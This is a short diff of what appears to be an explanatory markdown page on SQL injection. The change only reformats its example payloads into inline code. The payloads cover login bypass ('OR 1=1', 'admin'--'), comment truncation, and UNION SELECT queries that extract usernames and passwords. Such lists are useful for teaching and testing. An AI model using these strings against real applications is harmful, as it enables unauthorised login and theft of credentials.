@@ -19,22 +19,22 @@ Many web applications are vulnerable to SQL Injection attacks, where an attacker
 
 ##### typical for login bypass:
 
-``` ' OR '1'='1
-``` ' OR 1=1 --
-``` ' OR '1'='1' --
-``` admin'--
-``` admin'#
+`' OR '1'='1`
+`' OR 1=1 --`
+`' OR '1'='1' --`
+`admin'--`
+`admin'#`
 
 ##### Used to cut off trailing logic:
 
-``` ' -- 
-``` '/* 
-``` admin'/* 
+`' -- `
+`'/* `
+`admin'/* `
 
 ##### Used to extract additional data:
 
-``` ' UNION SELECT NULL, NULL --
-``` ' UNION SELECT username, password FROM users --
+`' UNION SELECT NULL, NULL --`
+`' UNION SELECT username, password FROM users --`
 
 
 
